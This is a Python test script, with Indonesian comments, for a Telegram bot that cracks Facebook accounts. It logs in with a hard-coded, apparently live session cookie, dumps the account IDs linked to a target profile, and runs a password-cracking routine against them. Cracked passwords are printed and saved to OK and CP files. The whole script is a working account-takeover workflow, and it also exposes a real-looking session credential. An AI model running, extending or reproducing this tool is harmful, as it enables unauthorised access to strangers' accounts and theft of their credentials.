#!/usr/bin/env python3
"""
Script Testing Bot Telegram - Test Lengkap Semua Fitur
"""

import os
import sys
import time

# Set environment agar tidak ada prompt
os.environ['PYTHONUNBUFFERED'] = '1'

# Masuk ke direktori Premium-2-1t dan tambahkan ke path
current_dir = os.path.dirname(os.path.abspath(__file__))
premium_dir = os.path.join(current_dir, 'Premium-2-1t')
sys.path.insert(0, premium_dir)

# Ubah working directory ke Premium-2-1t
os.chdir(premium_dir)

from core.auth import FacebookAuth
from core.dumper import FacebookDumper
from core.cracker import FacebookCracker
from rich.console import Console
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn

console = Console()

def print_header(title):
    """Print header dengan border"""
    console.print(Panel(f"[bold cyan]{title}[/bold cyan]", border_style="cyan"))

def test_login(cookie):
    """Test login dengan cookie"""
    print_header("🔐 TEST LOGIN FACEBOOK")
    
    auth = FacebookAuth()
    success, message, token = auth.save_cookie(cookie)
    
    if success:
        console.print(f"[green]✅ {message}[/green]")
        return auth, token
    else:
        console.print(f"[red]❌ {message}[/red]")
        return None, None

def test_dump(auth, target_id):
    """Test dump ID dari target"""
    print_header("📥 TEST DUMP ID PUBLIK")
    
    console.print(f"[yellow]Target ID: {target_id}[/yellow]")
    console.print("[yellow]Memulai dump...[/yellow]\n")
    
    # Gunakan cookie_raw dan token dari auth
    dumper = FacebookDumper(auth.cookie_raw, auth.token)
    
    def progress_callback(count):
        console.print(f"[cyan]Progress: {count} ID telah di-dump...[/cyan]")
    
    # Gunakan method dump_public yang benar
    success, message, id_list = dumper.dump_public(target_id, progress_callback)
    
    if success:
        console.print(f"\n[green]{message}[/green]")
        
        # Konversi id_list dari string menjadi dict format
        formatted_ids = []
        for id_str in id_list:
            parts = id_str.split('|')
            if len(parts) >= 2:
                formatted_ids.append({
                    'id': parts[0],
                    'name': parts[1]
                })
        
        # Tampilkan 5 ID pertama sebagai preview
        if formatted_ids:
            console.print("\n[yellow]Preview 5 ID pertama:[/yellow]")
            for i, id_data in enumerate(formatted_ids[:5], 1):
                console.print(f"  {i}. {id_data['id']} - {id_data['name']}")
        
        return formatted_ids
    else:
        console.print(f"[red]{message}[/red]")
        return []

def test_crack(id_list, method="mobile"):
    """Test crack ID"""
    print_header(f"💥 TEST CRACK FACEBOOK (Method: {method})")
    
    if not id_list:
        console.print("[red]❌ Tidak ada ID untuk di-crack![/red]")
        return
    
    # Ambil beberapa ID untuk test (maksimal 10 untuk demo)
    test_ids = id_list[:10]
    console.print(f"[yellow]Akan crack {len(test_ids)} ID (dari total {len(id_list)} ID)[/yellow]\n")
    
    cracker = FacebookCracker(max_workers=10)
    results_ok = []
    results_cp = []
    
    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        console=console
    ) as progress:
        task = progress.add_task("Cracking...", total=len(test_ids))
        
        for idx, id_data in enumerate(test_ids, 1):
            user_id = id_data['id']
            name = id_data['name']
            
            progress.update(task, description=f"Crack {idx}/{len(test_ids)}: {name}")
            
            # Crack single ID
            result = cracker.crack_single(user_id, name, method=method)
            
            if result:
                if result['status'] == 'OK':
                    results_ok.append(result)
                    console.print(f"[green]✅ OK: {name} | {result['password']}[/green]")
                elif result['status'] == 'CP':
                    results_cp.append(result)
                    console.print(f"[yellow]⚠️  CP: {name} | {result['password']}[/yellow]")
            
            progress.advance(task)
            time.sleep(0.5)  # Delay antar request
    
    # Tampilkan summary
    console.print("\n")
    print_header("📊 HASIL CRACK")
    console.print(f"[green]✅ OK: {len(results_ok)}[/green]")
    console.print(f"[yellow]⚠️  CP: {len(results_cp)}[/yellow]")
    console.print(f"[red]❌ FAILED: {len(test_ids) - len(results_ok) - len(results_cp)}[/red]")
    
    # Simpan hasil ke file
    if results_ok:
        save_results("OK", results_ok)
    if results_cp:
        save_results("CP", results_cp)
    
    return results_ok, results_cp

def save_results(status, results):
    """Simpan hasil crack ke file"""
    folder = status  # Karena sudah di dalam folder Premium-2-1t
    os.makedirs(folder, exist_ok=True)
    
    timestamp = time.strftime("%Y-%m-%d_%H-%M-%S")
    filename = f"{folder}/hasil_{timestamp}.txt"
    
    with open(filename, 'w') as f:
        for result in results:
            f.write(f"{result['id']}|{result['password']}|{result['name']}\n")
    
    console.print(f"[cyan]💾 Hasil {status} disimpan ke: {filename}[/cyan]")

def main():
    """Fungsi utama testing"""
    console.print("\n")
    print_header("🤖 BOT TELEGRAM FACEBOOK CRACK - FULL TEST")
    console.print("\n")
    
    # Data test dari user
    COOKIE = "dbln=%7B%22100023449360931%22%3A%22VG56uyjD%22%2C%2261583843228443%22%3A%22fPOY5Jyk%22%7D; sb=-1sdadTuYQAS1RJL4Zr-RkZs; ps_l=1; ps_n=1; dpr=2.673030376434326; locale=id_ID; datr=jk0eaSuT60mOUzhTIRrh6TMC; pas=61583843228443%3APpfCvpKTmQ; vpd=v1%3B1002x502x2.4312500953674316; wl_cbv=v2%3Bclient_version%3A2991%3Btimestamp%3A1763787674; c_user=100023449360931; wd=891x1779; fr=148lFZ1YeD6icu7vP.AWf6UIDJeUHVPmlGHayoNXgjZ5orSFvsMynTHzJ7EzRoICFpSdM.BpIe-m..AAA.0.0.BpIe-m.AWdOwaUI4GkW03Q2BmRtZYWVLnY; xs=35%3AM7eLT4CupP467g%3A2%3A1763788618%3A-1%3A-1%3A%3AAczigOtkcilAAETw1TjjhLoVwEXukCFBHmtFOPbftQ; presence=C%7B%22t3%22%3A%5B%5D%2C%22utc3%22%3A1763834476847%2C%22v%22%3A1%7D"
    TARGET_ID = "100028074584110"
    
    try:
        # Step 1: Test Login
        auth, token = test_login(COOKIE)
        if not auth:
            console.print("[red]❌ Login gagal! Test dihentikan.[/red]")
            return
        
        console.print("\n")
        time.sleep(1)
        
        # Step 2: Test Dump
        id_list = test_dump(auth, TARGET_ID)
        if not id_list:
            console.print("[red]❌ Dump gagal! Test dihentikan.[/red]")
            return
        
        console.print("\n")
        time.sleep(1)
        
        # Step 3: Test Crack
        results_ok, results_cp = test_crack(id_list, method="mobile")
        
        console.print("\n")
        print_header("✅ TEST SELESAI")
        console.print("[green]Semua fitur bot telah diuji![/green]")
        
        if results_ok or results_cp:
            console.print("\n[cyan]Silakan cek folder OK/ dan CP/ untuk hasil lengkap[/cyan]")
        
    except KeyboardInterrupt:
        console.print("\n[yellow]⚠️  Test dibatalkan oleh user[/yellow]")
    except Exception as e:
        console.print(f"\n[red]❌ Error: {str(e)}[/red]")
        import traceback
        traceback.print_exc()

if __name__ == "__main__":
    main()
